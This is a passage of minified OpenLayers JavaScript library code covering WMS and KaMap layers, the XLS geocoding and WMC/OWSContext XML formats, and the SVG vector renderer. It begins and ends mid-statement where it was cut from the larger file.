this.createElementNSPlus(\"sld:Format\",{value:a})}}},OpenLayers.Format.Filter.v1_0_0.prototype.writers),CLASS_NAME:\"OpenLayers.Format.SLD.v1\"});OpenLayers.Layer.WMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{service:\"WMS\",version:\"1.1.1\",request:\"GetMap\",styles:\"\",format:\"image/jpeg\"},isBaseLayer:!0,encodeBBOX:!1,noMagic:!1,yx:{},initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);1.3<=parseFloat(c.VERSION)&&!c.EXCEPTIONS&&(c.EXCEPTIONS=\"INIMAGE\");e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));\n!this.noMagic&&(this.params.TRANSPARENT&&\"true\"==this.params.TRANSPARENT.toString().toLowerCase())&&(null!=d&&d.isBaseLayer||(this.isBaseLayer=!1),\"image/jpeg\"==this.params.FORMAT&&(this.params.FORMAT=OpenLayers.Util.alphaHack()?\"image/gif\":\"image/png\"))},clone:function(a){null==a&&(a=new OpenLayers.Layer.WMS(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},reverseAxisOrder:function(){var a=this.projection.getCode();return 1.3<=parseFloat(this.params.VERSION)&&\n!!(this.yx[a]||OpenLayers.Projection.defaults[a]&&OpenLayers.Projection.defaults[a].yx)},getURL:function(a){a=this.adjustBounds(a);var b=this.getImageSize(),c={},d=this.reverseAxisOrder();c.BBOX=this.encodeBBOX?a.toBBOX(null,d):a.toArray(d);c.WIDTH=b.w;c.HEIGHT=b.h;return this.getFullRequestString(c)},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},getFullRequestString:function(a,b){var c=this.map.getProjectionObject(),\nc=this.projection&&this.projection.equals(c)?this.projection.getCode():c.getCode(),c=\"none\"==c?null:c;1.3<=parseFloat(this.params.VERSION)?this.params.CRS=c:this.params.SRS=c;\"boolean\"==typeof this.params.TRANSPARENT&&(a.TRANSPARENT=this.params.TRANSPARENT?\"TRUE\":\"FALSE\");return OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Layer.WMS\"});OpenLayers.Layer.KaMap=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,DEFAULT_PARAMS:{i:\"jpeg\",map:\"\"},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=-Math.round(a.top/b);return this.getFullRequestString({t:a,l:d,s:c})},calculateGridLayout:function(a,\nb,c){b=c*this.tileSize.w;c*=this.tileSize.h;return{tilelon:b,tilelat:c,startcol:Math.floor(a.left/b)-this.buffer,startrow:Math.floor(a.top/c)+this.buffer}},getTileBoundsForGridIndex:function(a,b){this.getTileOrigin();var c=this.gridLayout,d=c.tilelon,e=c.tilelat,f=(c.startcol+b)*d,c=(c.startrow-a)*e;return new OpenLayers.Bounds(f,c,f+d,c+e)},clone:function(a){null==a&&(a=new OpenLayers.Layer.KaMap(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.Grid.prototype.clone.apply(this,\n[a]);null!=this.tileSize&&(a.tileSize=this.tileSize.clone());a.grid=[];return a},getTileBounds:function(a){var b=this.getResolution(),c=b*this.tileSize.w,b=b*this.tileSize.h,d=this.getLonLatFromViewPortPx(a);a=c*Math.floor(d.lon/c);d=b*Math.floor(d.lat/b);return new OpenLayers.Bounds(a,d,a+c,d+b)},CLASS_NAME:\"OpenLayers.Layer.KaMap\"});OpenLayers.Format.WMC.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:\"1.1.0\",schemaLocation:\"http://www.opengis.net/context http://schemas.opengis.net/context/1.1.0/context.xsd\",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_sld_MinScaleDenominator:function(a,b){var c=parseFloat(this.getChildValue(b));0<c&&(a.maxScale=c)},read_sld_MaxScaleDenominator:function(a,b){a.minScale=parseFloat(this.getChildValue(b))},read_wmc_SRS:function(a,b){\"srs\"in\na||(a.srs={});a.srs[this.getChildValue(b)]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,[a]);if(a.maxScale){var c=this.createElementNS(this.namespaces.sld,\"sld:MinScaleDenominator\");c.appendChild(this.createTextNode(a.maxScale.toPrecision(16)));b.appendChild(c)}a.minScale&&(c=this.createElementNS(this.namespaces.sld,\"sld:MaxScaleDenominator\"),c.appendChild(this.createTextNode(a.minScale.toPrecision(16))),b.appendChild(c));if(a.srs)for(var d in a.srs)b.appendChild(this.createElementDefaultNS(\"SRS\",\nd));b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&&b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a));return b},CLASS_NAME:\"OpenLayers.Format.WMC.v1_1_0\"});OpenLayers.Format.XLS=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.1.0\",stringifyOutput:!0,CLASS_NAME:\"OpenLayers.Format.XLS\"});OpenLayers.Format.XLS.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xls:\"http://www.opengis.net/xls\",gml:\"http://www.opengis.net/gml\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},xy:!0,defaultPrefix:\"xls\",schemaLocation:null,read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{xls:{XLS:function(a,b){b.version=a.getAttribute(\"version\");\nthis.readChildNodes(a,b)},Response:function(a,b){this.readChildNodes(a,b)},GeocodeResponse:function(a,b){b.responseLists=[];this.readChildNodes(a,b)},GeocodeResponseList:function(a,b){var c={features:[],numberOfGeocodedAddresses:parseInt(a.getAttribute(\"numberOfGeocodedAddresses\"))};b.responseLists.push(c);this.readChildNodes(a,c)},GeocodedAddress:function(a,b){var c=new OpenLayers.Feature.Vector;b.features.push(c);this.readChildNodes(a,c);c.geometry=c.components[0]},GeocodeMatchCode:function(a,b){b.attributes.matchCode=\n{accuracy:parseFloat(a.getAttribute(\"accuracy\")),matchType:a.getAttribute(\"matchType\")}},Address:function(a,b){var c={countryCode:a.getAttribute(\"countryCode\"),addressee:a.getAttribute(\"addressee\"),street:[],place:[]};b.attributes.address=c;this.readChildNodes(a,c)},freeFormAddress:function(a,b){b.freeFormAddress=this.getChildValue(a)},StreetAddress:function(a,b){this.readChildNodes(a,b)},Building:function(a,b){b.building={number:a.getAttribute(\"number\"),subdivision:a.getAttribute(\"subdivision\"),\nbuildingName:a.getAttribute(\"buildingName\")}},Street:function(a,b){b.street.push(this.getChildValue(a))},Place:function(a,b){b.place[a.getAttribute(\"type\")]=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)}},gml:OpenLayers.Format.GML.v3.prototype.readers.gml},write:function(a){return this.writers.xls.XLS.apply(this,[a])},writers:{xls:{XLS:function(a){var b=this.createElementNSPlus(\"xls:XLS\",{attributes:{version:this.VERSION,\"xsi:schemaLocation\":this.schemaLocation}});\nthis.writeNode(\"RequestHeader\",a.header,b);this.writeNode(\"Request\",a,b);return b},RequestHeader:function(a){return this.createElementNSPlus(\"xls:RequestHeader\")},Request:function(a){var b=this.createElementNSPlus(\"xls:Request\",{attributes:{methodName:\"GeocodeRequest\",requestID:a.requestID||\"\",version:this.VERSION}});this.writeNode(\"GeocodeRequest\",a.addresses,b);return b},GeocodeRequest:function(a){for(var b=this.createElementNSPlus(\"xls:GeocodeRequest\"),c=0,d=a.length;c<d;c++)this.writeNode(\"Address\",\na[c],b);return b},Address:function(a){var b=this.createElementNSPlus(\"xls:Address\",{attributes:{countryCode:a.countryCode}});a.freeFormAddress?this.writeNode(\"freeFormAddress\",a.freeFormAddress,b):(a.street&&this.writeNode(\"StreetAddress\",a,b),a.municipality&&this.writeNode(\"Municipality\",a.municipality,b),a.countrySubdivision&&this.writeNode(\"CountrySubdivision\",a.countrySubdivision,b),a.postalCode&&this.writeNode(\"PostalCode\",a.postalCode,b));return b},freeFormAddress:function(a){return this.createElementNSPlus(\"freeFormAddress\",\n{value:a})},StreetAddress:function(a){var b=this.createElementNSPlus(\"xls:StreetAddress\");a.building&&this.writeNode(b,\"Building\",a.building);a=a.street;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=0,d=a.length;c<d;c++)this.writeNode(\"Street\",a[c],b);return b},Building:function(a){return this.createElementNSPlus(\"xls:Building\",{attributes:{number:a.number,subdivision:a.subdivision,buildingName:a.buildingName}})},Street:function(a){return this.createElementNSPlus(\"xls:Street\",{value:a})},Municipality:function(a){return this.createElementNSPlus(\"xls:Place\",\n{attributes:{type:\"Municipality\"},value:a})},CountrySubdivision:function(a){return this.createElementNSPlus(\"xls:Place\",{attributes:{type:\"CountrySubdivision\"},value:a})},PostalCode:function(a){return this.createElementNSPlus(\"xls:PostalCode\",{value:a})}}},CLASS_NAME:\"OpenLayers.Format.XLS.v1\"});OpenLayers.Format.XLS.v1_1_0=OpenLayers.Class(OpenLayers.Format.XLS.v1,{VERSION:\"1.1\",schemaLocation:\"http://www.opengis.net/xls http://schemas.opengis.net/ols/1.1.0/LocationUtilityService.xsd\",CLASS_NAME:\"OpenLayers.Format.XLS.v1_1_0\"});OpenLayers.Format.XLS.v1_1=OpenLayers.Format.XLS.v1_1_0;OpenLayers.Renderer.SVG=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:\"http://www.w3.org/2000/svg\",xlinkns:\"http://www.w3.org/1999/xlink\",MAX_PIXEL:15E3,translationParameters:null,symbolMetrics:null,initialize:function(a){this.supported()&&(OpenLayers.Renderer.Elements.prototype.initialize.apply(this,arguments),this.translationParameters={x:0,y:0},this.symbolMetrics={})},supported:function(){return document.implementation&&(document.implementation.hasFeature(\"org.w3c.svg\",\"1.0\")||document.implementation.hasFeature(\"http://www.w3.org/TR/SVG11/feature#SVG\",\n\"1.1\")||document.implementation.hasFeature(\"http://www.w3.org/TR/SVG11/feature#BasicStructure\",\"1.1\"))},inValidRange:function(a,b,c){a+=c?0:this.translationParameters.x;b+=c?0:this.translationParameters.y;return a>=-this.MAX_PIXEL&&a<=this.MAX_PIXEL&&b>=-this.MAX_PIXEL&&b<=this.MAX_PIXEL},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=-a.left/d,d=a.top/d;if(b)return this.left=e,this.top=d,this.rendererRoot.setAttributeNS(null,\n\"viewBox\",\"0 0 \"+this.size.w+\" \"+this.size.h),this.translate(this.xOffset,0),!0;(e=this.translate(e-this.left+this.xOffset,d-this.top))||this.setExtent(a,!0);return c&&e},translate:function(a,b){if(this.inValidRange(a,b,!0)){var c=\"\";if(a||b)c=\"translate(\"+a+\",\"+b+\")\";this.root.setAttributeNS(null,\"transform\",c);this.translationParameters={x:a,y:b};return!0}return!1},setSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);this.rendererRoot.setAttributeNS(null,\"width\",this.size.w);\nthis.rendererRoot.setAttributeNS(null,\"height\",this.size.h)},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case \"OpenLayers.Geometry.Point\":c=b.externalGraphic?\"image\":this.isComplexSymbol(b.graphicName)?\"svg\":\"circle\";break;case \"OpenLayers.Geometry.Rectangle\":c=\"rect\";break;case \"OpenLayers.Geometry.LineString\":c=\"polyline\";break;case \"OpenLayers.Geometry.LinearRing\":c=\"polygon\";break;case \"OpenLayers.Geometry.Polygon\":case \"OpenLayers.Geometry.Curve\":c=\"path\"}return c},setStyle:function(a,\nb,c){b=b||a._style;c=c||a._options;var d=b.title||b.graphicTitle;if(d){a.setAttributeNS(null,\"title\",d);var e=a.getElementsByTagName(\"title\");0<e.length?e[0].firstChild.textContent=d:(e=this.nodeFactory(null,\"title\"),e.textContent=d,a.appendChild(e))}var e=parseFloat(a.getAttributeNS(null,\"r\")),d=1,f;if(\"OpenLayers.Geometry.Point\"==a._geometryClass&&e){a.style.visibility=\"\";if(!1===b.graphic)a.style.visibility=\"hidden\";else if(b.externalGraphic){f=this.getPosition(a);b.graphicWidth&&b.graphicHeight&&\na.setAttributeNS(null,\"preserveAspectRatio\",\"none\");var e=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),k=b.graphicOpacity||b.fillOpacity;a.setAttributeNS(null,\"x\",(f.x+(void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e))).toFixed());a.setAttributeNS(null,\"y\",(f.y+h).toFixed());a.setAttributeNS(null,\"width\",e);a.setAttributeNS(null,\"height\",g);a.setAttributeNS(this.xlinkns,\"xlink:href\",\nb.externalGraphic);a.setAttributeNS(null,\"style\",\"opacity: \"+k);a.onclick=OpenLayers.Event.preventDefault}else if(this.isComplexSymbol(b.graphicName)){var e=3*b.pointRadius,g=2*e,l=this.importSymbol(b.graphicName);f=this.getPosition(a);d=3*this.symbolMetrics[l.id][0]/g;h=a.parentNode;k=a.nextSibling;h&&h.removeChild(a);a.firstChild&&a.removeChild(a.firstChild);a.appendChild(l.firstChild.cloneNode(!0));a.setAttributeNS(null,\"viewBox\",l.getAttributeNS(null,\"viewBox\"));a.setAttributeNS(null,\"width\",\ng);a.setAttributeNS(null,\"height\",g);a.setAttributeNS(null,\"x\",f.x-e);a.setAttributeNS(null,\"y\",f.y-e);k?h.insertBefore(a,k):h&&h.appendChild(a)}else a.setAttributeNS(null,\"r\",b.pointRadius);e=b.rotation;void 0===e&&void 0===a._rotation||!f||(a._rotation=e,e|=0,\"svg\"!==a.nodeName?a.setAttributeNS(null,\"transform\",\"rotate(\"+e+\" \"+f.x+\" \"+f.y+\")\"):(f=this.symbolMetrics[l.id],a.firstChild.setAttributeNS(null,\"transform\",\"rotate(\"+e+\" \"+f[1]+\" \"+f[2]+\")\")))}c.isFilled?(a.setAttributeNS(null,\"fill\",b.fillColor),\na.setAttributeNS(null,\"fill-opacity\",b.fillOpacity)):a.setAttributeNS(null,\"fill\",\"none\");c.isStroked?(a.setAttributeNS(null,\"stroke\",b.strokeColor),a.setAttributeNS(null,\"stroke-opacity\",b.strokeOpacity),a.setAttributeNS(null,\"stroke-width\",b.strokeWidth*d),a.setAttributeNS(null,\"stroke-linecap\",b.strokeLinecap||\"round\"),a.setAttributeNS(null,\"stroke-linejoin\",\"round\"),b.strokeDashstyle&&a.setAttributeNS(null,\"stroke-dasharray\",this.dashStyle(b,d))):a.setAttributeNS(null,\"stroke\",\"none\");b.pointerEvents&&\na.setAttributeNS(null,\"pointer-events\",b.pointerEvents);null!=b.cursor&&a.setAttributeNS(null,\"cursor\",b.cursor);return a},dashStyle:function(a,b){var c=a.strokeWidth*b,d=a.strokeDashstyle;switch(d){case \"solid\":return\"none\";case \"dot\":return[1,4*c].join();case \"dash\":return[4*c,4*c].join();case \"dashdot\":return[4*c,4*c,1,4*c].join();case \"longdash\":return[8*c,4*c].join();case \"longdashdot\":return[8*c,4*c,1,4*c].join();default:return OpenLayers.String.trim(d).replace(/\\s+/g,\",\")}},createNode:function(a,\nb){var c=document.createElementNS(this.xmlns,a);b&&c.setAttributeNS(null,\"id\",b);return c},nodeTypeCompare:function(a,b){return b==a.nodeName},createRenderRoot:function(){var a=this.nodeFactory(this.container.id+\"_svgRoot\",\"svg\");a.style.display=\"block\";return a},createRoot:function(a){return this.nodeFactory(this.container.id+a,\"g\")},createDefs:function(){var a=this.nodeFactory(this.container.id+\"_defs\",\"defs\");this.rendererRoot.appendChild(a);return a},drawPoint:function(a,b){return this.drawCircle(a,\nb,1)},drawCircle:function(a,b,c){var d=this.getResolution(),e=(b.x-this.featureDx)/d+this.left;b=this.top-b.y/d;return this.inValidRange(e,b)?(a.setAttributeNS(null,\"cx\",e),a.setAttributeNS(null,\"cy\",b),a.setAttributeNS(null,\"r\",c),a):!1},drawLineString:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,\"points\",c.path),c.complete?a:null):!1},drawLinearRing:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,\n\"points\",c.path),c.complete?a:null):!1},drawPolygon:function(a,b){for(var c=\"\",d=!0,e=!0,f,g,h=0,k=b.components.length;h<k;h++)c+=\" M\",f=this.getComponentsString(b.components[h].components,\" \"),(g=f.path)?(c+=\" \"+g,e=f.complete&&e):d=!1;return d?(a.setAttributeNS(null,\"d\",c+\" z\"),a.setAttributeNS(null,\"fill-rule\",\"evenodd\"),e?a:null):!1},drawRectangle:function(a,b){var c=this.getResolution(),d=(b.x-this.featureDx)/c+this.left,e=this.top-b.y/c;return this.inValidRange(d,e)?(a.setAttributeNS(null,\"x\",\nd),a.setAttributeNS(null,\"y\",e),a.setAttributeNS(null,\"width\",b.width/c),a.setAttributeNS(null,\"height\",b.height/c),a):!1},drawText:function(a,b,c){var d=!!b.labelOutlineWidth;if(d){var e=OpenLayers.Util.extend({},b);e.fontColor=e.labelOutlineColor;e.fontStrokeColor=e.labelOutlineColor;e.fontStrokeWidth=b.labelOutlineWidth;b.labelOutlineOpacity&&(e.fontOpacity=b.labelOutlineOpacity);delete e.labelOutlineWidth;this.drawText(a,e,c)}var f=this.getResolution(),e=(c.x-this.featureDx)/f+this.left,g=c.y/\nf-this.top,d=d?this.LABEL_OUTLINE_SUFFIX:this.LABEL_ID_SUFFIX,f=this.nodeFactory(a+d,\"text\");f.setAttributeNS(null,\"x\",e);f.setAttributeNS(null,\"y\",-g);b.fontColor&&f.setAttributeNS(null,\"fill\",b.fontColor);b.fontStrokeColor&&f.setAttributeNS(null,\"stroke\",b.fontStrokeColor);b.fontStrokeWidth&&f.setAttributeNS(null,\"stroke-width\",b.fontStrokeWidth);b.fontOpacity&&f.setAttributeNS(null,\"opacity\",b.fontOpacity);b.fontFamily&&f.setAttributeNS(null,\"font-family\",b.fontFamily);b.fontSize&&f.setAttributeNS(null,\n\"font-size\",b.fontSize);b.fontWeight&&f.setAttributeNS(null,\"font-weight\",b.fontWeight);b.fontStyle&&f.setAttributeNS(null,\"font-style\",b.fontStyle);!0===b.labelSelect?(f.setAttributeNS(null,\"pointer-events\",\"visible\"),f._featureId=a):f.setAttributeNS(null,\"pointer-events\",\"none\");g=b.labelAlign||OpenLayers.Renderer.defaultSymbolizer.labelAlign;f.setAttributeNS(null,\"text-anchor\",OpenLayers.Renderer.SVG.LABEL_ALIGN[g[0]]||\"middle\");!0===OpenLayers.IS_GECKO&&f.setAttributeNS(null,\"dominant-baseline\",\nOpenLayers.Renderer.SVG.LABEL_ALIGN[g[1]]||\"central\");for(var h=b.label.split(\"\\n\"),k=h.length;f.childNodes.length>k;)f.removeChild(f.lastChild);for(var l=0;l<k;l++){var m=this.nodeFactory(a+d+\"_tspan_\"+l,\"tspan\");!0===b.labelSelect&&(m._featureId=a,m._geometry=c,m._geometryClass=c.CLASS_NAME);!1===OpenLayers.IS_GECKO&&m.setAttributeNS(null,\"baseline-shift\",OpenLayers.Renderer.SVG.LABEL_VSHIFT[g[1]]||\"-35%\");m.setAttribute(\"x\",e);if(0==l){var n=OpenLayers.Renderer.SVG.LABEL_VFACTOR[g[1]];null==n&&\n(n=-0.5);m.setAttribute(\"dy\",n*(k-1)+\"em\")}else m.setAttribute(\"dy\",\"1em\");m.textContent=\"\"===h[l]?\" \":h[l];m.parentNode||f.appendChild(m)}f.parentNode||this.textRoot.appendChild(f)},getComponentsString:function(a,b){for(var c=[],d=!0,e=a.length,f=[],g,h=0;h<e;h++)g=a[h],c.push(g),(g=this.getShortString(g))?f.push(g):(0<h&&this.getShortString(a[h-1])&&f.push(this.clipLine(a[h],a[h-1])),h<e-1&&this.getShortString(a[h+1])&&f.push(this.clipLine(a[h],a[h+1])),d=!1);return{path:f.join(b||\",\"),complete:d}},\nclipLine:function(a,b){if(b.equals(a))return\"\";var c=this.getResolution(),d=this.MAX_PIXEL-this.translationParameters.x,e=this.MAX_PIXEL-this.translationParameters.y,f=(b.x-this.featureDx)/c+this.left,g=this.top-b.y/c,h=(a.x-this.featureDx)/c+this.left,c=this.top-a.y/c,k;if(h<-d||h>d)k=(c-g)/(h-f),h=0>h?-d:d,c=g+(h-f)*k;if(c<-e||c>e)k=(h-f)/(c-g),c=0>c?-e:e,h=f+(c-g)*k;return h+\",\"+c},getShortString:function(a){var b=this.getResolution(),c=(a.x-this.featureDx)/b+this.left;a=this.top-a.y/b;return this.inValidRange(c,\na)?c+\",\"+a:!1},getPosition:function(a){return{x:parseFloat(a.getAttributeNS(null,\"cx\")),y:parseFloat(a.getAttributeNS(null,\"cy\"))}},importSymbol:function(a){this.defs||(this.defs=this.createDefs());var b=this.container.id+\"-\"+a,c=document.getElementById(b);if(null!=c)return c;var d=OpenLayers.Renderer.symbol[a];if(!d)throw Error(a+\" is not a valid symbol name\");a=this.nodeFactory(b,\"symbol\");var e=this.nodeFactory(null,\"polygon\");a.appendChild(e);for(var c=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,\n0,0),f=[],g,h,k=0;k<d.length;k+=2)g=d[k],h=d[k+1],c.left=Math.min(c.left,g),c.bottom=Math.min(c.bottom,h),c.right=Math.max(c.right,g),c.top=Math.max(c.top,h),f.push(g,\",\",h);e.setAttributeNS(null,\"points\",f.join(\" \"));d=c.getWidth();e=c.getHeight();a.setAttributeNS(null,\"viewBox\",[c.left-d,c.bottom-e,3*d,3*e].join(\" \"));this.symbolMetrics[b]=[Math.max(d,e),c.getCenterLonLat().lon,c.getCenterLonLat().lat];this.defs.appendChild(a);return a},getFeatureIdFromEvent:function(a){var b=OpenLayers.Renderer.Elements.prototype.getFeatureIdFromEvent.apply(this,\narguments);b||(b=a.target,b=b.parentNode&&b!=this.rendererRoot?b.parentNode._featureId:void 0);return b},CLASS_NAME:\"OpenLayers.Renderer.SVG\"});OpenLayers.Renderer.SVG.LABEL_ALIGN={l:\"start\",r:\"end\",b:\"bottom\",t:\"hanging\"};OpenLayers.Renderer.SVG.LABEL_VSHIFT={t:\"-70%\",b:\"0\"};OpenLayers.Renderer.SVG.LABEL_VFACTOR={t:0,b:-1};OpenLayers.Renderer.SVG.preventDefault=function(a){OpenLayers.Event.preventDefault(a)};OpenLayers.Format.SLD.v1_0_0=OpenLayers.Class(OpenLayers.Format.SLD.v1,{VERSION:\"1.0.0\",schemaLocation:\"http://www.opengis.net/sld http://schemas.opengis.net/sld/1.0.0/StyledLayerDescriptor.xsd\",CLASS_NAME:\"OpenLayers.Format.SLD.v1_0_0\"});OpenLayers.Format.OWSContext=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:\"0.3.1\",getVersion:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.getVersion.apply(this,arguments);\"0.3.0\"===c&&(c=this.defaultVersion);return c},toContext:function(a){var b={};\"OpenLayers.Map\"==a.CLASS_NAME&&(b.bounds=a.getExtent(),b.maxExtent=a.maxExtent,b.projection=a.projection,b.size=a.getSize(),b.layers=a.layers);return b},CLASS_NAME:\"OpenLayers.Format.OWSContext\"});OpenLayers.Format.OWSContext.v0_3_1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{owc:\"http://www.opengis.net/ows-context\",gml:\"http://www.opengis.net/gml\",kml:\"http://www.opengis.net/kml/2.2\",ogc:\"http://www.opengis.net/ogc\",ows:\"http://www.opengis.net/ows\",sld:\"http://www.opengis.net/sld\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},VERSION:\"0.3.1\",schemaLocation:\"http://www.opengis.net/ows-context http://www.ogcnetwork.net/schemas/owc/0.3.1/owsContext.xsd\",\ndefaultPrefix:\"owc\",extractAttributes:!0,xy:!0,regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},featureNS:\"http://mapserver.gis.umn.edu/mapserver\",featureType:\"vector\",geometryName:\"geometry\",nestingLayerLookup:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);OpenLayers.Format.GML.v2.prototype.setGeometryTypes.call(this)},setNestingPath:function(a){if(a.layersContext)for(var b=0,c=a.layersContext.length;b<c;b++){var d=\na.layersContext[b],e=[],f=a.title||\"\";a.metadata&&a.metadata.nestingPath&&(e=a.metadata.nestingPath.slice());\"\"!=f&&e.push(f);d.metadata.nestingPath=e;d.layersContext&&this.setNestingPath(d)}},decomposeNestingPath:function(a){var b=[];if(OpenLayers.Util.isArray(a)){for(a=a.slice();0<a.length;)b.push(a.slice()),a.pop();b.reverse()}return b},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,\nb);this.setNestingPath({layersContext:b.layersContext});a=[];this.processLayer(a,b);delete b.layersContext;b.layersContext=a;return b},processLayer:function(a,b){if(b.layersContext)for(var c=0,d=b.layersContext.length;c<d;c++){var e=b.layersContext[c];a.push(e);e.layersContext&&this.processLayer(a,e)}},write:function(a,b){this.nestingLayerLookup={};b=b||{};OpenLayers.Util.applyDefaults(b,a);var c=this.writeNode(\"OWSContext\",b);this.nestingLayerLookup=null;this.setAttributeNS(c,this.namespaces.xsi,\n\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},readers:{kml:{Document:function(a,b){b.features=(new OpenLayers.Format.KML({kmlns:this.namespaces.kml,extractStyles:!0})).read(a)}},owc:{OWSContext:function(a,b){this.readChildNodes(a,b)},General:function(a,b){this.readChildNodes(a,b)},ResourceList:function(a,b){this.readChildNodes(a,b)},Layer:function(a,b){var c={metadata:{},visibility:\"1\"!=a.getAttribute(\"hidden\"),queryable:\"1\"==a.getAttribute(\"queryable\"),\nopacity:null!=a.getAttribute(\"opacity\")?parseFloat(a.getAttribute(\"opacity\")):null,name:a.getAttribute(\"name\"),categoryLayer:null==a.getAttribute(\"name\"),formats:[],styles:[]};b.layersContext||(b.layersContext=[]);b.layersContext.push(c);this.readChildNodes(a,c)},InlineGeometry:function(a,b){b.features=[];var c=this.getElementsByTagNameNS(a,this.namespaces.gml,\"featureMember\"),d;1<=c.length&&(d=c[0]);d&&d.firstChild&&(c=d.firstChild.nextSibling?d.firstChild.nextSibling:d.firstChild,this.setNamespace(\"feature\",\nc.namespaceURI),this.featureType=c.localName||c.nodeName.split(\":\").pop(),this.readChildNodes(a,b))},Server:function(a,b){if(!b.service&&!b.version||b.service!=OpenLayers.Format.Context.serviceTypes.WMS)b.service=a.getAttribute(\"service\"),b.version=a.getAttribute(\"version\"),this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a);this.readChildNodes(a,b)},Title:function(a,b){b.title=this.getChildValue(a);this.readChildNodes(a,b)},StyleList:function(a,b){this.readChildNodes(a,b.styles)},\nStyle:function(a,b){var c={};b.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={};b.legend=c;this.readChildNodes(a,c)},OnlineResource:function(a,b){b.url=this.getAttributeNS(a,this.namespaces.xlink,\"href\");this.readChildNodes(a,b)}},ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows,gml:OpenLayers.Format.GML.v2.prototype.readers.gml,sld:OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld,feature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{owc:{OWSContext:function(a){var b=\nthis.createElementNSPlus(\"OWSContext\",{attributes:{version:this.VERSION,id:a.id||OpenLayers.Util.createUniqueID(\"OpenLayers_OWSContext_\")}});this.writeNode(\"General\",a,b);this.writeNode(\"ResourceList\",a,b);return b},General:function(a){var b=this.createElementNSPlus(\"General\");this.writeNode(\"ows:BoundingBox\",a,b);this.writeNode(\"ows:Title\",a.title||\"OpenLayers OWSContext\",b);return b},ResourceList:function(a){for(var b=this.createElementNSPlus(\"ResourceList\"),c=0,d=a.layers.length;c<d;c++){var e=\na.layers[c],f=this.decomposeNestingPath(e.metadata.nestingPath);this.writeNode(\"_Layer\",{layer:e,subPaths:f},b)}return b},Server:function(a){var b=this.createElementNSPlus(\"Server\",{attributes:{version:a.version,service:a.service}});this.writeNode(\"OnlineResource\",a,b);return b},OnlineResource:function(a){return this.createElementNSPlus(\"OnlineResource\",{attributes:{\"xlink:href\":a.url}})},InlineGeometry:function(a){var b=this.createElementNSPlus(\"InlineGeometry\"),c=a.getDataExtent();null!==c&&this.writeNode(\"gml:boundedBy\",\nc,b);for(var c=0,d=a.features.length;c<d;c++)this.writeNode(\"gml:featureMember\",a.features[c],b);return b},StyleList:function(a){for(var b=this.createElementNSPlus(\"StyleList\"),c=0,d=a.length;c<d;c++)this.writeNode(\"Style\",a[c],b);return b},Style:function(a){var b=this.createElementNSPlus(\"Style\");this.writeNode(\"Name\",a,b);this.writeNode(\"Title\",a,b);a.legend&&this.writeNode(\"LegendURL\",a,b);return b},Name:function(a){return 